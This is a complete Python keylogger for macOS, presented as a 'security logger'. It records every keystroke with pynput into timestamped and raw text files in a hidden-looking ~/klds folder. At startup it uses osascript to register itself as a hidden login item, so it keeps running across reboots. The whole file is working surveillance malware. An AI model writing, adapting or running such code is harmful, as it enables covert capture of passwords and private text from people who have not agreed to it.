#!/usr/local/bin/python3.9
# LogOsx python security logger
# Made by Izaan
import datetime
import getpass
import random
import string
import os
import subprocess
from pathlib import Path
from pynput.keyboard import Key, Listener



def persist(path, hidden=True):
    subprocess.Popen(
        f"""osascript -e 'tell application "System Events" to make login item at end with properties {{path:"{path}", hidden:{hidden}}}'""",
        shell=True)


# Persist makes the final app into a login item.
persist(path=Path(__file__).parents[2])


def id_gen(size=3, chars=string.ascii_lowercase + string.ascii_lowercase + string.digits):
    id_ = ''
    ctime = datetime.datetime.now()
    for _ in range(size):
        id_ += random.choice(chars)
    return id_, ctime


# We use this function to replace space and backspace keys for the raw log.


def replace_keys(key, raw_file):
    updated_key = ''
    key = str(key)
    if 'Key.' in key:
        if 'Key.space' in key:
            updated_key = ' '
        elif 'Key.backspace' in key:
            raw_file.truncate(raw_file.tell() - 1)  # we remove a character from the end of the file.
    else:
        updated_key = key
    return updated_key


# Checks if directories are made to store logs.

if not os.path.exists(f'/Users/{getpass.getuser()}/klds'):
    os.mkdir(f'/Users/{getpass.getuser()}/klds')
    os.mkdir(f'/Users/{getpass.getuser()}/klds/format')
    os.mkdir(f'/Users/{getpass.getuser()}/klds/raw')
id_, ctime = id_gen(size=0)  # we have the option to create an id and get the current time for the file name.
output = f'/Users/{getpass.getuser()}/klds/format/[{ctime}].txt'
raw_output = f'/Users/{getpass.getuser()}/klds/raw/[RAW] {ctime}.txt'
recent_keys = []
exit_keys = ['Key.esc', 'Key.space']


# Whenever we press a key this function runs.

def on_press(key, rk_num=2):  # rk_num is the recent key number to track so if you want more keys change the number
    ctime = datetime.datetime.now()
    key_formatted = str(key).replace("'", "")
    with open(output, 'a') as file:  # we open a new file and write the current time the key was pressed and the key.
        file.write(f'[{ctime}] {key} pressed.\n')
        file.close()
    with open(raw_output, 'a') as raw_file:  # we open another file to write the raw output (live text).
        raw_file.write(replace_keys(key_formatted, raw_file))
        raw_file.close()
    if len(recent_keys) < rk_num:
        recent_keys.append(key_formatted)
    else:
        recent_keys.clear()
        recent_keys.append(key_formatted)


# When ever we release a key this function runs.

def on_release(key):
    if recent_keys == exit_keys:
        return False
        # we don't return false because we don't want the program to be exited, if we do we uncomment the line


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
